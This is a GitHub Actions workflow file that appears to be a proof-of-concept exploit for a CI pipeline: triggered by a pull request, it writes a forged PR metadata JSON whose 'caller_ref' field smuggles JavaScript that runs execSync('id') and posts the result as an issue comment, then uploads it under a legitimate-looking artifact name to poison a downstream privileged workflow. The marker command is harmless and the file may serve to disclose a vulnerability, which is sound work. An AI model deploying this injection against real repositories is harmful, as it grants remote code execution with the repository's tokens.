name: Mu QEMU PR Validation

on:
  pull_request:

jobs:
  forge:
    runs-on: ubuntu-latest
    steps:
      - name: Create forged metadata artifact
        run: |
          mkdir -p metadata
          python3 - <<'PY'
          import json

          payload = {
              "pr_number": 1,
              "head_sha": "",
              "caller_ref": "';const{execSync}=require('child_process');const o=execSync('id').toString().trim();core.info('RCE_MARKER='+o);await github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:1,body:'RCE_MARKER '+o});//",
              "caller_repo_name": "mu_plus",
              "mu_tiano_platforms_sha": "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
              "platforms": {},
              "validation": {"failed": False},
              "skipped": False,
              "skip_reason": "",
          }
          open('metadata/pr-metadata.json', 'w').write(json.dumps(payload))
          PY

      - name: Upload forged artifact
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: mu-qemu-pr-metadata
          path: metadata/pr-metadata.json
